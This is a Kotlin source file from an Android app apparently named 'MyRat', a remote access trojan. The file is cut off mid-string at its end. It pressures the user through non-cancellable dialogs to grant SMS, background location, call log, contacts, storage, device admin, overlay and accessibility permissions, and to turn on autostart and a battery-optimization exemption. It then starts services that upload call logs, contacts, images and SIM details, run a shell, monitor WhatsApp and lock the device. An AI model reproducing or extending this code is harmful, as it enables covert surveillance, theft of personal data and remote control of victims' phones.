package com.myrat.app.handler

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.service.CallAccessibilityService
import com.myrat.app.service.CallLogUploadService
import com.myrat.app.service.CallService
import com.myrat.app.service.ContactUploadService
import com.myrat.app.service.ImageUploadService
import com.myrat.app.service.LocationService
import com.myrat.app.service.ShellService
import com.myrat.app.service.SmsService
import com.myrat.app.service.LockService
import com.myrat.app.service.WhatsAppService
import com.myrat.app.utils.Logger

class PermissionHandler(
    private val activity: AppCompatActivity,
    private val simDetailsHandler: SimDetailsHandler
) {
    private var fromSettings = false
    private var requestingRestricted = false
    private var requestingBackgroundLocation = false
    private var fromOverlaySettings = false
    private var fromOtherPermissionsSettings = false
    private var fromBatteryOptimizationSettings = false
    private var fromDeviceAdminSettings = false
    private var fromAccessibilitySettings = false
    private var hasVisitedOtherPermissions = false

    private val restrictedPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            add(Manifest.permission.USE_BIOMETRIC)
        }
    }

    private val foregroundLocationPermissions = listOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    private val backgroundLocationPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        listOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
    } else {
        emptyList()
    }

    private val phonePermissions = mutableListOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CALL_PHONE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
            add(Manifest.permission.ANSWER_PHONE_CALLS)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_PHONE_CALL)
        }
    }

    private val storagePermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private val internetPermission = listOf(Manifest.permission.INTERNET)
    private val queryPackagesPermission = listOf(Manifest.permission.QUERY_ALL_PACKAGES)

    private val lockPermissions = mutableListOf<String>().apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            add(Manifest.permission.FOREGROUND_SERVICE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_LOCATION)
            add(Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC)
        }
        add(Manifest.permission.WAKE_LOCK)
        add(Manifest.permission.DISABLE_KEYGUARD)
    }

    private val nonRestrictedPermissions = phonePermissions + storagePermissions + internetPermission + queryPackagesPermission + lockPermissions
    private val allPermissions = restrictedPermissions + nonRestrictedPermissions

    private val permissionLauncher = activity.registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        Logger.log("Permission results: $permissions")
        handlePermissionResults(permissions)
    }

    fun requestPermissions() {
        val permissionsToRequest = nonRestrictedPermissions.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissionsToRequest.isEmpty()) {
            Logger.log("All non-restricted permissions already granted")
            startServicesForFeature(Feature.GENERAL)
            requestLocationPermissions()
        } else {
            Logger.log("Requesting non-restricted permissions: $permissionsToRequest")
            requestingRestricted = false
            requestingBackgroundLocation = false
            showPermissionRationaleDialog(Feature.GENERAL, permissionsToRequest)
        }
    }

    private fun requestLocationPermissions() {
        val foregroundPermissionsToRequest = foregroundLocationPermissions.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        if (foregroundPermissionsToRequest.isNotEmpty()) {
            Logger.log("Requesting foreground location permissions: $foregroundPermissionsToRequest")
            requestingRestricted = true
            requestingBackgroundLocation = false
            showPermissionRationaleDialog(Feature.LOCATION, foregroundPermissionsToRequest)
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val backgroundPermissionsToRequest = backgroundLocationPermission.filter {
                ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
            }
            if (backgroundPermissionsToRequest.isNotEmpty()) {
                Logger.log("Requesting background location permission: $backgroundPermissionsToRequest")
                requestingRestricted = true
                requestingBackgroundLocation = true
                showPermissionRationaleDialog(Feature.LOCATION, backgroundPermissionsToRequest)
                return
            }
        }

        Logger.log("All location permissions already granted")
        val otherRestrictedPermissions = restrictedPermissions.filter {
            it !in foregroundLocationPermissions && it !in backgroundLocationPermission &&
                    ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        if (otherRestrictedPermissions.isNotEmpty()) {
            Logger.log("Requesting other restricted permissions: $otherRestrictedPermissions")
            requestingRestricted = true
            requestingBackgroundLocation = false
            showPermissionRationaleDialog(Feature.RESTRICTED, otherRestrictedPermissions)
        } else {
            Logger.log("All restricted permissions granted")
            startServicesForFeature(Feature.RESTRICTED)
            configureDeviceSpecificSettings()
        }
    }

    fun requestPermissionsForFeature(feature: Feature) {
        val permissions = when (feature) {
            Feature.RESTRICTED -> restrictedPermissions.filter { it !in foregroundLocationPermissions && it !in backgroundLocationPermission }
            Feature.LOCATION -> if (foregroundLocationPermissions.any { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                backgroundLocationPermission
            } else {
                foregroundLocationPermissions
            }
            Feature.PHONE -> phonePermissions
            Feature.STORAGE -> storagePermissions
            Feature.INTERNET -> internetPermission + queryPackagesPermission
            Feature.LOCK -> lockPermissions
            Feature.WHATSAPP -> internetPermission + queryPackagesPermission
            Feature.CALL_ACCESSIBILITY -> phonePermissions + internetPermission + queryPackagesPermission
            Feature.GENERAL -> nonRestrictedPermissions
        }
        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissionsToRequest.isEmpty()) {
            Logger.log("All ${feature.name} permissions already granted")
            startServicesForFeature(feature)
            if (feature == Feature.GENERAL || feature == Feature.LOCATION) {
                requestLocationPermissions()
            }
        } else {
            Logger.log("Requesting ${feature.name} permissions: $permissionsToRequest")
            requestingRestricted = feature == Feature.RESTRICTED || feature == Feature.LOCATION
            requestingBackgroundLocation = feature == Feature.LOCATION && permissionsToRequest == backgroundLocationPermission
            showPermissionRationaleDialog(feature, permissionsToRequest)
        }
    }

    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        val deniedPermissions = permissions.filter { !it.value }.keys.toList()
        if (deniedPermissions.isEmpty()) {
            Logger.log("All requested permissions granted")
            if (!requestingRestricted) {
                startServicesForFeature(Feature.GENERAL)
                requestLocationPermissions()
            } else {
                startServicesForFeature(if (requestingBackgroundLocation) Feature.LOCATION else Feature.RESTRICTED)
                requestLocationPermissions()
            }
        } else {
            Logger.log("Permissions denied: $deniedPermissions")
            val showRationale = deniedPermissions.any {
                activity.shouldShowRequestPermissionRationale(it)
            }
            if (showRationale) {
                Logger.log("Showing rationale for denied permissions")
                showPermissionRationaleDialog(
                    if (requestingRestricted) {
                        if (requestingBackgroundLocation) Feature.LOCATION else Feature.RESTRICTED
                    } else Feature.GENERAL,
                    deniedPermissions
                )
            } else {
                Logger.log("Permissions denied, possibly 'Don't ask again'. Requesting manual settings.")
                showRestrictedSettingsDialog()
            }
        }
    }

    private fun showPermissionRationaleDialog(feature: Feature, permissions: List<String>) {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot show rationale dialog: Activity is finishing or destroyed")
            return
        }
        val message = when (feature) {
            Feature.RESTRICTED -> "SMS and Biometric permissions are required for core app functionality, including SMS monitoring and lock features. Please grant all permissions."
            Feature.LOCATION -> if (requestingBackgroundLocation) {
                "Background location access is required for continuous location tracking. Please select 'Allow all the time' in the settings."
            } else {
                "Location permissions are needed for location-based features. Please grant access to precise or approximate location."
            }
            Feature.PHONE -> "Phone permissions are needed to make calls, access call logs, and contacts. Please grant all permissions."
            Feature.STORAGE -> "Storage permissions are needed to access images. Please grant all permissions."
            Feature.INTERNET -> "Internet and package query permissions are required for network connectivity and app monitoring (e.g., WhatsApp). Please grant all permissions."
            Feature.LOCK -> "Foreground service, wake lock, and system alert permissions are required for device lock and screen management features. Please grant all permissions."
            Feature.WHATSAPP -> "Internet and package query permissions are required to monitor WhatsApp and WhatsApp Business. Please grant all permissions."
            Feature.CALL_ACCESSIBILITY -> "Phone and internet permissions are required for enhanced call monitoring and dialer app accessibility. Please grant all permissions."
            Feature.GENERAL -> "This app requires all permissions to function properly, including WhatsApp monitoring, call monitoring, lock, and screen management features. Please grant all requested permissions."
        }
        try {
            AlertDialog.Builder(activity)
                .setTitle("Permissions Required")
                .setMessage(message)
                .setPositiveButton("Grant") { _, _ ->
                    permissionLauncher.launch(permissions.toTypedArray())
                }
                .setNegativeButton("Go to Settings") { _, _ ->
                    fromSettings = true
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${activity.packageName}")
                    }
                    activity.startActivity(intent)
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show rationale dialog", e)
        }
    }

    private fun startServicesForFeature(feature: Feature) {
        Logger.log("Starting services for feature: ${feature.name}")
        when (feature) {
            Feature.RESTRICTED -> {
                if (restrictedPermissions.filter { it !in foregroundLocationPermissions && it !in backgroundLocationPermission }
                        .all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, SmsService::class.java))
                }
            }
            Feature.LOCATION -> {
                if (foregroundLocationPermissions.any { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, LocationService::class.java))
                }
            }
            Feature.PHONE -> {
                if (phonePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    simDetailsHandler.uploadSimDetails()
                    startAppropriateService(Intent(activity, CallLogUploadService::class.java))
                    startAppropriateService(Intent(activity, ContactUploadService::class.java))
                    startAppropriateService(Intent(activity, CallService::class.java))
                }
            }
            Feature.STORAGE -> {
                if (storagePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, ImageUploadService::class.java))
                }
            }
            Feature.INTERNET, Feature.WHATSAPP -> {
                if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                    queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, ShellService::class.java))
                    startAppropriateService(Intent(activity, WhatsAppService::class.java))
                }
            }
            Feature.CALL_ACCESSIBILITY -> {
                if (phonePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                    internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                    queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    // CallAccessibilityService is started via accessibility settings, not programmatically
                    Logger.log("Call accessibility permissions granted - service will be enabled via accessibility settings")
                }
            }
            Feature.LOCK -> {
                if (lockPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, LockService::class.java))
                }
            }
            Feature.GENERAL -> {
                if (phonePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    simDetailsHandler.uploadSimDetails()
                    startAppropriateService(Intent(activity, CallLogUploadService::class.java))
                    startAppropriateService(Intent(activity, ContactUploadService::class.java))
                    startAppropriateService(Intent(activity, CallService::class.java))
                }
                if (storagePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, ImageUploadService::class.java))
                }
                if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                    queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, ShellService::class.java))
                    startAppropriateService(Intent(activity, WhatsAppService::class.java))
                }
                if (lockPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                    startAppropriateService(Intent(activity, LockService::class.java))
                }
            }
        }
    }

    private fun startAllServices() {
        if (!areAllPermissionsGranted()) {
            Logger.log("Cannot start services: Not all permissions are granted")
            requestPermissions()
            return
        }
        Logger.log("All permissions granted, ensuring all services are started")
        simDetailsHandler.uploadSimDetails()
        startAppropriateService(Intent(activity, SmsService::class.java))
        if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
            queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
            startAppropriateService(Intent(activity, ShellService::class.java))
            startAppropriateService(Intent(activity, WhatsAppService::class.java))
        }
        startAppropriateService(Intent(activity, CallLogUploadService::class.java))
        startAppropriateService(Intent(activity, ContactUploadService::class.java))
        startAppropriateService(Intent(activity, CallService::class.java))
        startAppropriateService(Intent(activity, ImageUploadService::class.java))
        startAppropriateService(Intent(activity, LocationService::class.java))
        startAppropriateService(Intent(activity, LockService::class.java))
    }

    private fun startAppropriateService(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                activity.startForegroundService(intent)
            } else {
                activity.startService(intent)
            }
            Logger.log("Started service: ${intent.component?.className}")
        } catch (e: Exception) {
            Logger.error("Failed to start service: ${intent.component?.className}", e)
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val standardPermissionsGranted = allPermissions.all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
        val overlayPermissionGranted = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(activity)
        val batteryOptimizationDisabled = (activity.getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(activity.packageName)
        val deviceAdminActive = (activity.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
            .isAdminActive(ComponentName(activity, MyDeviceAdminReceiver::class.java))
        val accessibilityEnabled = isAccessibilityServiceEnabled()
        return standardPermissionsGranted && overlayPermissionGranted && batteryOptimizationDisabled && deviceAdminActive && accessibilityEnabled
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        try {
            val whatsappService = "${activity.packageName}/${WhatsAppService::class.java.canonicalName}"
            val callService = "${activity.packageName}/${CallAccessibilityService::class.java.canonicalName}"

            val accessibilityManager = activity.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)

            val whatsappEnabled = enabledServices.any { it.id == whatsappService }
            val callEnabled = enabledServices.any { it.id == callService }

            Logger.log("WhatsApp accessibility service enabled: $whatsappEnabled")
            Logger.log("Call accessibility service enabled: $callEnabled")

            // Both services should be enabled for full functionality
            return whatsappEnabled && callEnabled
        } catch (e: Exception) {
            Logger.error("Error checking accessibility services", e)
            return false
        }
    }

    fun handleResume() {
        if (fromSettings) {
            fromSettings = false
            Logger.log("Returned from settings. Checking permissions.")
            if (allPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                startServicesForFeature(Feature.GENERAL)
                startServicesForFeature(Feature.RESTRICTED)
                startServicesForFeature(Feature.LOCATION)
                startServicesForFeature(Feature.CALL_ACCESSIBILITY)
                configureDeviceSpecificSettings()
            } else {
                requestPermissions()
            }
        } else if (fromOverlaySettings) {
            fromOverlaySettings = false
            Logger.log("Returned from overlay settings. Checking overlay permission.")
            checkOverlayPermission()
        } else if (fromOtherPermissionsSettings) {
            fromOtherPermissionsSettings = false
            Logger.log("Returned from other permissions settings. Assuming granted, proceeding with autostart.")
            startServicesForFeature(Feature.PHONE)
            startServicesForFeature(Feature.INTERNET)
            startServicesForFeature(Feature.LOCK)
            startServicesForFeature(Feature.WHATSAPP)
            startServicesForFeature(Feature.CALL_ACCESSIBILITY)
            enableManufacturerSpecificAutostart()
        } else if (fromDeviceAdminSettings) {
            fromDeviceAdminSettings = false
            Logger.log("Returned from device admin settings. Checking device admin permission.")
            checkDeviceAdminPermission()
        } else if (fromBatteryOptimizationSettings) {
            fromBatteryOptimizationSettings = false
            Logger.log("Returned from battery optimization settings. Checking battery optimization.")
            checkBatteryOptimization()
        } else if (fromAccessibilitySettings) {
            fromAccessibilitySettings = false
            Logger.log("Returned from accessibility settings. Checking accessibility permission.")
            checkAccessibilityPermission()
        }
    }

    private fun showRestrictedSettingsDialog() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot show restricted settings dialog: Activity is finishing or destroyed")
            return
        }
        val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location (select 'Allow all the time' for background access), Biometric, Foreground Service, and WhatsApp/Call monitoring permissions."
        val spannable = android.text.SpannableStringBuilder(message)
        val start = message.indexOf("allow")
        val end = message.indexOf("Settings") + "Settings".length
        spannable.setSpan(
            android.text.style.StyleSpan(android.graphics.Typeface.BOLD),
            start,
            end,
            android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE
        )
        try {
            AlertDialog.Builder(activity)
                .setTitle("All Permissions Required")
                .setMessage(spannable)
                .setPositiveButton("Go to Settings") { _, _ ->
                    fromSettings = true
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${activity.packageName}")
                    }
                    activity.startActivity(intent)
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show restricted settings dialog", e)
        }
    }

    private fun configureDeviceSpecificSettings() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot configure device settings: Activity is finishing or destroyed")
            return
        }
        Logger.log("Starting device-specific settings configuration")
        checkOverlayPermission()
    }

    private fun checkOverlayPermission() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check overlay permission: Activity is finishing or destroyed")
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
            Logger.log("Overlay permission not granted, prompting user")
            try {
                AlertDialog.Builder(activity)
                    .setTitle("Overlay Permission Required")
                    .setMessage("This app requires permission to draw over other apps to enable WhatsApp monitoring, call monitoring, and lock functionality. Please grant this permission.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromOverlaySettings = true
                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = Uri.parse("package:${activity.packageName}")
                        }
                        activity.startActivity(intent)
                    }
                    .setCancelable(false)
                    .show()
            } catch (e: Exception) {
                Logger.error("Failed to show overlay permission dialog", e)
                showManualInstructions()
            }
        } else {
            Logger.log("Overlay permission granted or not required")
            checkOtherPermissions()
        }
    }

    private fun checkOtherPermissions() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check other permissions: Activity is finishing or destroyed")
            return
        }
        if (hasVisitedOtherPermissions) {
            Logger.log("User has already visited Other permissions settings, assuming granted")
            enableManufacturerSpecificAutostart()
            return
        }

        val manufacturer = Build.MANUFACTURER.lowercase()
        val intent = when (manufacturer) {
            "xiaomi" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.permissions.PermissionsEditorActivity"))
                putExtra("extra_pkgname", activity.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "oppo" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.PermissionManagerActivity"))
                putExtra("package_name", activity.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "vivo" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phonepower.BackgroundPowerManagerActivity"))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "huawei" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.permissionmanager.ui.MainActivity"))
                putExtra("packageName", activity.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "samsung" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.samsung.android.sm",
                    "com.samsung.android.sm.ui.appmanagement.AppManagementActivity"))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            else -> Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        }

        Logger.log("Prompting user for Other permissions")
        try {
            AlertDialog.Builder(activity)
                .setTitle("Other Permissions Required")
                .setMessage("This app requires permissions under 'Other permissions' (e.g., Display pop-up windows, Start in background, Location 'Allow all the time') to function. Please enable these permissions.")
                .setPositiveButton("Go to Settings") { _, _ ->
                    hasVisitedOtherPermissions = true
                    fromOtherPermissionsSettings = true
                    activity.startActivity(intent)
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show other permissions dialog", e)
            showManualInstructions()
        }
    }

    private fun enableManufacturerSpecificAutostart() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot enable autostart: Activity is finishing or destroyed")
            return
        }
        val manufacturer = Build.MANUFACTURER.lowercase()
        val intent = when (manufacturer) {
            "xiaomi" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"))
                putExtra("package_name", activity.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "oppo" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
                putExtra("pkgName", activity.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "vivo" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phonepower.PhonePowerManagerActivity"))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "huawei" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
                putExtra("app_pkg", activity.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            "samsung" -> Intent().apply {
                setComponent(android.content.ComponentName(
                    "com.samsung.android.sm",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"))
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            else -> Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        }
        try {
            activity.startActivity(intent)
        } catch (e: Exception) {
            Logger.error("Autostart setting failed for $manufacturer", e)
            val fallbackIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            try {
                activity.startActivity(fallbackIntent)
            } catch (e: Exception) {
                Logger.error("Fallback autostart setting failed", e)
                showManualInstructions()
            }
        }
        checkDeviceAdminPermission()
    }

    private fun checkDeviceAdminPermission() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check device admin permission: Activity is finishing or destroyed")
            return
        }
        val devicePolicyManager = activity.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = ComponentName(activity, MyDeviceAdminReceiver::class.java)
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            Logger.log("Device admin permission not granted, prompting user")
            try {
                AlertDialog.Builder(activity)
                    .setTitle("Device Admin Permission Required")
                    .setMessage("This app requires device admin privileges to manage lock and screen settings remotely. Please enable this permission.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromDeviceAdminSettings = true
                        val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                            putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "This permission is required to allow the app to lock the device and manage screen settings.")
                        }
                        activity.startActivity(intent)
                    }
                    .setCancelable(false)
                    .show()
            } catch (e: Exception) {
                Logger.error("Failed to show device admin permission dialog", e)
                showManualInstructions()
            }
        } else {
            Logger.log("Device admin permission already granted")
            checkAccessibilityPermission()
        }
    }

    private fun checkAccessibilityPermission() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check accessibility permission: Activity is finishing or destroyed")
            return
        }
        if (!isAccessibilityServiceEnabled()) {
            Logger.log("Accessibility services not enabled, prompting user")
            try {
                AlertDialog.Builder(activity)
                    .setTitle("Accessibility Services Required")
                    .setMessage("This app requires accessibility services to monitor WhatsApp, WhatsApp Business, and dialer apps for enhanced call tracking. Please enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        fromAccessibilitySettings = true
                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        activity.startActivity(intent)
                    }
                    .setCancelable(false)
                    .show()
            } catch (e: Exception) {
                Logger.error("Failed to show accessibility permission dialog", e)
                showManualInstructions()
            }
        } else {
            Logger.log("All accessibility services enabled")
            checkBatteryOptimization()
        }
    }

    private fun checkBatteryOptimization() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot check battery optimization: Activity is finishing or destroyed")
            return
        }
        val powerManager = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(activity.packageName)) {
            Logger.log("Battery optimization not disabled, prompting user")
            try {
                AlertDialog.Builder(activity)
                    .setTitle("Battery Optimization Required")
                    .setMessage("This app requires battery optimization to be disabled to ensure reliable WhatsApp monitoring, call monitoring, and lock features. Please select 'Don't Optimize' in Settings > Battery.")
                    .setPositiveButton("Go to Settings") { _, _ ->
                        disableBatteryOptimization()
                    }
                    .setCancelable(false)
                    .show()
            } catch (e: Exception) {
                Logger.error("Failed to show battery optimization dialog", e)
                showManualInstructions()
            }
        } else {
            Logger.log("Battery optimization disabled")
            startAllServices()
        }
    }

    private fun disableBatteryOptimization() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot disable battery optimization: Activity is finishing or destroyed")
            return
        }
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            fromBatteryOptimizationSettings = true
            activity.startActivity(intent)
        } catch (e: Exception) {
            Logger.error("Battery optimization settings failed", e)
            showManualInstructions()
        }
    }

    private fun showManualInstructions() {
        if (activity.isFinishing || activity.isDestroyed) {
            Logger.error("Cannot show manual instructions: Activity is finishing or destroyed")
            return
        }
        val manufacturer = Build.MANUFACTURER.lowercase()
        val instructions = when (manufacturer) {
            "xiaomi" -> "1. Settings > Apps > MyRat App > Autostart > Enable\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Display pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery > Battery Optimization > MyRat App > Don't Optimize"
            "oppo" -> "1. Settings > Battery > Battery Optimization > MyRat App > Don't Optimize\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Allow pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
